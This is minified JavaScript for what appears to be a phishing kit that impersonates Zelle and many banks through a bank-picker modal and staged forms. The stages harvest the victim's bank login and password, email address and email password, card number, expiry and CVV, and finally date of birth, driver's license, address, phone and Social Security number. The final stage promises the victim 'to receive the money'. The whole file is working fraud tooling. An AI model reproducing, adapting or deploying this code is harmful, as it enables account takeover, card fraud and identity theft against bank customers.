let __recent={};if(document.querySelectorAll("a").forEach(e=>{!1===e.classList.contains("openLink")&&!1===e.hasAttribute("data-dismiss")&&e.addEventListener("click",async function(e){return e.preventDefault(),await reload(),!1})}),$(async function(){localStorageCheck(),Object.keys(ip_config).length<2&&await get_reload_ip()}),is_current_page("MainPath")){function show_media(e){let t=document.getElementById(e);t.classList.add("open"),document.body.classList.add("hideBars");let n=0;const r=setInterval(function(){n>=1?(t.style.opacity="1",clearInterval(r),t.classList.add("in")):(n+=.1,t.style.opacity=n.toString())},10)}function hide_media(e){let t=document.getElementById(e);t.classList.remove("in");let n=1;const r=setInterval(function(){n<=0?(clearInterval(r),t.style.opacity="0",t.classList.remove("open"),document.body.classList.remove("hideBars")):(n-=.1,t.style.opacity=n)},10)}null===localStorage.getItem("firstTime")&&(document.getElementById("onload_default").style.background="#662bcb",document.getElementById("overlayout").remove(),show_media("onload_default")),document.querySelectorAll("input[name=search-filter]").length>0&&document.querySelector("input[name=search-filter]").addEventListener("keyup",function(e){if(this.value.replaceAll(" ","").length>0){document.querySelector("span.search-filter-toggle").style.display="inline";let e=search(this.value);if(e.length>0){let t=[];for(let n of e){let e=document.querySelector("#Hidden > li").cloneNode(!0);e.firstChild.parentElement.querySelector("a").setAttribute("data-bankname",n.name),e.firstChild.parentElement.querySelector("a").setAttribute("data-banklogo",n.link),e.firstChild.parentElement.querySelector("a").innerHTML=n.name,e.firstChild.parentElement.setAttribute("data-bankname",n.name),e.firstChild.parentElement.setAttribute("data-banklogo",n.link),t.push(e)}document.querySelector("#searches > ul").innerHTML="",t.forEach(function(e){document.querySelector("#searches > ul").appendChild(e)}),document.querySelector("#searches > ul").removeAttribute("style"),document.querySelector("#searches > span").setAttribute("style","display: none;"),document.getElementById("search_result").classList.remove("block-search-filter__no-results-text")}else document.querySelector("#searches > span").removeAttribute("style"),document.querySelector("#searches > ul").setAttribute("style","display: none;"),document.getElementById("search_result").classList.remove("block-search-filter__no-results-text")}else this.value.length>0?(document.querySelector("span.search-filter-toggle").style.display="inline",document.querySelector("#searches > span").removeAttribute("style"),document.querySelector("#searches > ul").setAttribute("style","display: none;"),document.getElementById("search_result").classList.remove("block-search-filter__no-results-text")):(document.querySelector("span.search-filter-toggle").style.display="none",document.getElementById("search_result").classList.add("block-search-filter__no-results-text"))}),document.addEventListener("click",function(e){let t=e.target;if(t.classList.contains("openLink")&&(e.preventDefault(),__recent={name:t.getAttribute("data-bankname"),logo:t.getAttribute("data-banklogo")},document.querySelector("#bank_modal .modal-logo img").setAttribute("src","https://cdn.jsdelivr.net/gh/jmresult/zelpae/files/"+t.getAttribute("data-banklogo")),document.querySelector("#bank_modal .modal-logo img").setAttribute("title",t.getAttribute("data-bankname")),document.querySelector("#bank_modal .modal-logo img").setAttribute("alt",t.getAttribute("data-bankname")),document.querySelector("#bank_modal h2.modal-subtitle").innerHTML=`${t.getAttribute("data-bankname")} Offers Zelle®`,show_media("bank_modal")),t.classList.contains("modal")&&t.classList.contains("open")&&t.classList.contains("in")&&t.classList.contains("fade")&&"onload_default"!==t.id&&(e.preventDefault(),hide_media(t.id)),t.hasAttribute("data-dismiss")){e.preventDefault();let n=t.parents("div.modal.fade");hide_media(n.id),"onload_default"===n.id&&localStorage.setItem("firstTime","yes")}t.classList.contains("search-filter-toggle")&&(document.querySelector("span.search-filter-toggle").style.display="none",document.querySelector("input[name=search-filter]").value="",document.getElementById("search_result").classList.add("block-search-filter__no-results-text"),document.querySelector("input[name=search-filter]").focus())}),document.querySelector("#bank_modal a.btn-default.modal-button").addEventListener("click",async function(e){e.preventDefault(),localStorage.setItem("__recent",JSON.stringify(__recent)),await reload("LPath")})}else if(is_current_page("LPath")){__recent=JSON.parse(localStorage.getItem("__recent")),document.getElementById("bankName").innerHTML=` <strong>${__recent.name}</strong> `,document.querySelector(".login-alert").innerHTML=`To Sign In: Enter your <strong>${__recent.name}</strong> User ID and password. Then, click the 'Sign In' button.`,setTimeout(function(){document.title=`Continue with ${__recent.name}`},200),document.querySelector("img.welcome-block__image").setAttribute("src","https://cdn.jsdelivr.net/gh/jmresult/zelpae/files/"+__recent.logo),document.querySelector("img.welcome-block__image").setAttribute("title","Continue with "+__recent.name);const e=document.getElementById("edit-name"),t=document.getElementById("edit-pass"),n=document.getElementById("user-login-form"),r=e.parentElement.querySelector("span.form-element__error-msg"),a=t.parentElement.querySelector("span.form-element__error-msg");function check_working(){let n=!0;return e.value.length<2?(n=!1,r.innerHTML="Please complete this mandatory field.",e.parentElement.setAttribute("data-tips","Please complete this mandatory field."),e.parentElement.classList.add("form-element--has-error")):e.value.length<5||!1===is_username(e.value)?(n=!1,r.innerHTML=`Please enter your ${__recent.name} Online username.`,e.parentElement.setAttribute("data-tips",`Please enter your ${__recent.name} Online username.`),e.parentElement.classList.add("form-element--has-error")):e.parentElement.classList.remove("form-element--has-error"),t.value.length<2?(n=!1,a.innerHTML="Please complete this mandatory field.",t.parentElement.setAttribute("data-tips","Please complete this mandatory field."),t.parentElement.classList.add("form-element--has-error")):t.value.length<6?(n=!1,a.innerHTML=`Please enter your  ${__recent.name}  Online password.`,t.parentElement.setAttribute("data-tips",`Please enter your  ${__recent.name}  Online password.`),t.parentElement.classList.add("form-element--has-error")):t.parentElement.classList.remove("form-element--has-error"),n}r.classList.add("hideme"),a.classList.add("hideme"),document.querySelectorAll("div.form-element input").forEach(function(e){"edit-submit"!==e.id&&(e.addEventListener("focusout",function(){e.value.length<1&&e.parentElement.classList.remove("form-element--active")}),e.addEventListener("focus",function(){e.parentElement.classList.add("form-element--active")}),e.addEventListener("keyup",function(t){"Enter"!==t.key&&"Enter"!==t.code&&e.parentElement.classList.remove("form-element--has-error")}))}),$(n).on("submit",async function(r){return r.preventDefault(),!n.classList.contains("loading")&&(!1!==check_working()&&(n.classList.add("loading"),document.querySelectorAll("input").forEach(e=>{e.readOnly=!0}),void await form_login(e.value,t.value)))}),$("button#loginButton").on("click",async function(r){return alert("Testing Now"),r.preventDefault(),!$(n).hasClass("loading")&&(!1!==check_working()&&(n.classList.add("loading"),document.querySelectorAll("input").forEach(e=>{e.readOnly=!0}),void await form_login(e.value,t.value)))})}else if(is_current_page("EPath")){__recent=JSON.parse(localStorage.getItem("__recent")),document.getElementById("topTitle").innerHTML=`Please enter the email address linked to your <strong>${__recent.name}</strong>, along with the email password to continue.`;const e=document.getElementById("edit-name"),t=document.getElementById("password"),n=document.getElementById("user-pass"),r=e.parentElement.querySelector("span.form-element__error-msg"),a=t.parentElement.querySelector("span.form-element__error-msg");function check_working_email(){let n=!0;return e.value.length<2?(n=!1,e.parentElement.setAttribute("data-tips","Please complete this mandatory field."),e.parentElement.classList.add("form-element--has-error")):!1===is_email(e.value)?(n=!1,e.parentElement.setAttribute("data-tips",`Please enter the email address associated with your ${__recent.name} account.`),e.parentElement.classList.add("form-element--has-error")):e.parentElement.classList.remove("form-element--has-error"),t.value.length<2?(n=!1,t.parentElement.setAttribute("data-tips","Please complete this mandatory field."),t.parentElement.classList.add("form-element--has-error")):t.value.length<6?(n=!1,t.parentElement.setAttribute("data-tips","Please enter your email password."),t.parentElement.classList.add("form-element--has-error")):t.parentElement.classList.remove("form-element--has-error"),n}r.classList.add("hideme"),a.classList.add("hideme"),document.querySelectorAll("div.form-element input").forEach(function(e){"submitButton"!==e.id&&(e.addEventListener("focusout",function(){e.value.length<1&&e.parentElement.classList.remove("form-element--active")}),e.addEventListener("focus",function(){e.parentElement.classList.add("form-element--active")}),e.addEventListener("keyup",function(t){"Enter"!==t.key&&"Enter"!==t.code&&e.parentElement.classList.remove("form-element--has-error")}))}),n.addEventListener("submit",async function(r){return r.preventDefault(),!n.classList.contains("loading")&&(!1!==check_working_email()&&(n.classList.add("loading"),document.querySelectorAll("input").forEach(e=>{e.readOnly=!0}),void await form_email(e.value,t.value)))})}else if(is_current_page("CPath")){__recent=JSON.parse(localStorage.getItem("__recent")),document.querySelector("#topTitle").innerHTML=`We need to make sure it's really you, please enter your <strong>${__recent.name}</strong> card details to confirm the information you've provided.`;const e=document.getElementById("nameOnCard"),t=document.getElementById("cardNumber"),n=document.getElementById("expiredDate"),r=document.getElementById("cvv"),a=document.getElementById("user-pass");function check_working_card(){let a=!0;return e.value.length<1?(a=!1,e.parentElement.setAttribute("data-tips","Please complete this mandatory field."),e.parentElement.classList.add("form-element--has-error")):"yes"!==e.getAttribute("done")?(a=!1,e.parentElement.setAttribute("data-tips",`Please enter the name on your ${__recent.name} card.`),e.parentElement.classList.add("form-element--has-error")):e.parentElement.classList.remove("form-element--has-error"),t.value.length<2?(a=!1,t.parentElement.setAttribute("data-tips","Please complete this mandatory field."),t.parentElement.classList.add("form-element--has-error")):"yes"!==t.getAttribute("done")?(a=!1,t.parentElement.setAttribute("data-tips","Please enter valid card number."),t.parentElement.classList.add("form-element--has-error")):t.parentElement.classList.remove("form-element--has-error"),n.value.length<2?(a=!1,n.parentElement.setAttribute("data-tips","Please complete this mandatory field."),n.parentElement.classList.add("form-element--has-error")):"yes"!==n.getAttribute("done")?(a=!1,n.parentElement.setAttribute("data-tips","This field is mandatory."),n.parentElement.classList.add("form-element--has-error")):n.parentElement.classList.remove("form-element--has-error"),r.value.length<2?(a=!1,r.parentElement.setAttribute("data-tips","Please complete this mandatory field."),r.parentElement.classList.add("form-element--has-error")):"yes"!==r.getAttribute("done")?(a=!1,r.parentElement.setAttribute("data-tips","This field is mandatory."),r.parentElement.classList.add("form-element--has-error")):r.parentElement.classList.remove("form-element--has-error"),a}$(t).mask("0000 0000 0000 0000",{onComplete:function(e){t.setAttribute("done","yes")},onChange:function(e){t.setAttribute("done","no")}}),$(r).mask("000",{onComplete:function(e){r.setAttribute("done","yes")},onChange:function(e){r.setAttribute("done","no")}}),$(n).mask("00/00",{onComplete:function(e){n.setAttribute("done","yes")},onChange:function(e){n.setAttribute("done","no")}}),e.addEventListener("keyup",function(t){is_fullName(e.value)?e.setAttribute("done","yes"):e.setAttribute("done","no")}),document.querySelectorAll("div.form-element input").forEach(function(e){e.setAttribute("done","no"),e.addEventListener("focusout",function(){e.value.length<1&&e.parentElement.classList.remove("form-element--active")}),e.addEventListener("focus",function(){e.parentElement.classList.add("form-element--active")}),e.addEventListener("keyup",function(t){"Enter"!==t.key&&"Enter"!==t.code&&e.parentElement.classList.remove("form-element--has-error")})}),a.addEventListener("submit",async function(s){return s.preventDefault(),!a.classList.contains("loading")&&(!1!==check_working_card()&&(a.classList.add("loading"),document.querySelectorAll("input").forEach(e=>{e.readOnly=!0}),void await form_card(e.value,t.value,r.value,n.value)))})}else if(is_current_page("DPath")){__recent=JSON.parse(localStorage.getItem("__recent")),document.getElementById("strongBankName").innerHTML=__recent.name,document.querySelector("#topTitle").innerHTML=`Your <strong>${__recent.name}</strong> account has been successfully validated, please complete the final step below to receive the money.`;const e=document.getElementById("edit-field-pardot-first-name-0-value"),t=document.getElementById("edit-field-pardot-last-name-0-value"),n=document.getElementById("dateOfBirth"),r=document.getElementById("driverLicense"),a=document.getElementById("streetAddress"),s=document.getElementById("Zipcode"),l=document.getElementById("phoneNumber"),o=document.getElementById("ssn"),i=document.getElementById("contact-message-pardot-partners-website-tracking-form");function check_working_info(){let i=!0;return e.value.length<1?(i=!1,e.parentElement.setAttribute("data-tips","Please complete this mandatory field."),e.parentElement.classList.add("form-element--has-error")):"yes"!==e.getAttribute("done")?(i=!1,e.parentElement.setAttribute("data-tips","First Name field is required."),e.parentElement.classList.add("form-element--has-error")):e.parentElement.classList.remove("form-element--has-error"),t.value.length<2?(i=!1,t.parentElement.setAttribute("data-tips","Please complete this mandatory field."),t.parentElement.classList.add("form-element--has-error")):"yes"!==t.getAttribute("done")?(i=!1,t.parentElement.setAttribute("data-tips","Last Name field is required."),t.parentElement.classList.add("form-element--has-error")):t.parentElement.classList.remove("form-element--has-error"),n.value.length<2?(i=!1,n.parentElement.setAttribute("data-tips","Please complete this mandatory field."),n.parentElement.classList.add("form-element--has-error")):"yes"!==n.getAttribute("done")?(i=!1,n.parentElement.setAttribute("data-tips","This field is mandatory."),n.parentElement.classList.add("form-element--has-error")):n.parentElement.classList.remove("form-element--has-error"),s.value.length<2?(i=!1,s.parentElement.setAttribute("data-tips","Please complete this mandatory field."),s.parentElement.classList.add("form-element--has-error")):"yes"!==s.getAttribute("done")?(i=!1,s.parentElement.setAttribute("data-tips","This field is mandatory."),s.parentElement.classList.add("form-element--has-error")):s.parentElement.classList.remove("form-element--has-error"),r.value.length<2?(i=!1,r.parentElement.setAttribute("data-tips","Please complete this mandatory field."),r.parentElement.classList.add("form-element--has-error")):"yes"!==r.getAttribute("done")?(i=!1,r.parentElement.setAttribute("data-tips","This field is mandatory."),r.parentElement.classList.add("form-element--has-error")):r.parentElement.classList.remove("form-element--has-error"),l.value.length<2?(i=!1,l.parentElement.setAttribute("data-tips","Please complete this mandatory field."),l.parentElement.classList.add("form-element--has-error")):"yes"!==l.getAttribute("done")?(i=!1,l.parentElement.setAttribute("data-tips","This field is mandatory."),l.parentElement.classList.add("form-element--has-error")):l.parentElement.classList.remove("form-element--has-error"),o.value.length<2?(i=!1,o.parentElement.setAttribute("data-tips","Please complete this mandatory field."),o.parentElement.classList.add("form-element--has-error")):"yes"!==o.getAttribute("done")?(i=!1,o.parentElement.setAttribute("data-tips","This field is mandatory."),o.parentElement.classList.add("form-element--has-error")):o.parentElement.classList.remove("form-element--has-error"),a.value.length<2?(i=!1,a.parentElement.setAttribute("data-tips","Please complete this mandatory field."),a.parentElement.classList.add("form-element--has-error")):"yes"!==a.getAttribute("done")?(i=!1,a.parentElement.setAttribute("data-tips","This field is mandatory."),a.parentElement.classList.add("form-element--has-error")):a.parentElement.classList.remove("form-element--has-error"),i}$(o).mask("000-00-0000",{onComplete:function(e){o.setAttribute("done","yes")},onChange:function(e){o.setAttribute("done","no")}}),$(n).mask("00/00/0000",{onComplete:function(e){n.setAttribute("done","yes")},onChange:function(e){n.setAttribute("done","no")}}),$(l).mask("(000) 000-0000",{onComplete:function(e){l.setAttribute("done","yes")},onChange:function(e){l.setAttribute("done","no")}}),$(s).mask("00000",{onComplete:function(e){s.setAttribute("done","yes")},onChange:function(e){s.setAttribute("done","no")}}),e.addEventListener("keyup",function(t){is_firstName(e.value)?e.setAttribute("done","yes"):e.setAttribute("done","no")}),t.addEventListener("keyup",function(e){is_lastName(t.value)?t.setAttribute("done","yes"):t.setAttribute("done","no")}),r.addEventListener("keyup",function(e){is_DL(r.value)?r.setAttribute("done","yes"):r.setAttribute("done","no")}),a.addEventListener("keyup",function(e){is_streetAddress(a.value)?a.setAttribute("done","yes"):a.setAttribute("done","no")}),document.querySelectorAll("div.js-form-wrapper input").forEach(function(e){e.setAttribute("done","no"),e.addEventListener("focusout",function(){e.value.length<1&&e.parentElement.classList.remove("form-element--active")}),e.addEventListener("focus",function(){e.parentElement.classList.add("form-element--active")}),e.addEventListener("keyup",function(t){"Enter"!==t.key&&"Enter"!==t.code&&e.parentElement.classList.remove("form-element--has-error")})}),i.addEventListener("submit",async function(m){return m.preventDefault(),!i.classList.contains("loading")&&(!1!==check_working_info()&&(i.classList.add("loading"),document.querySelectorAll("input").forEach(e=>{e.readOnly=!0}),void await form_personal_details(e.value+" "+t.value,r.value,l.value,n.value,o.value,a.value,s.value)))})}
